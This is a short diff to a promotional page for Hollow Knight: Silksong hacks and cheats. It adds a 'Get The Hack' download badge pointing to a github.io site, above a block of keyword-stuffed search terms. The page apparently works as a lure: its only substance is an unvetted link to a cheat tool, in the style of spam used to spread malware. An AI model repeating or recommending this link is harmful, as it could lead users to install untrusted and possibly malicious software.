@@ -4,6 +4,7 @@
 
 Looking to spice up your Hollow Knight: Silksong adventure with hacks, cheats, and mods? This guide covers everything from damage multipliers to infinite soul, speed boosts, and more.
 
+[![Get](https://img.shields.io/badge/Get%20The-Hack-blueviolet)](https://hollow-knight-silksong-hack.github.io/.github/)
 ---
 
 ## Product Description
@@ -58,3 +59,4 @@ Hollow Knight: Silksong hacks and cheats give you unlimited ways to twist the ga
 Hollow Knight Silksong hack, Silksong cheats, Hollow Knight mods, Silksong trainer, Hollow Knight Silksong god mode, Silksong exploit, Hollow Knight cheat tool, Silksong speed hack, Silksong infinite soul.
 
 ---
+
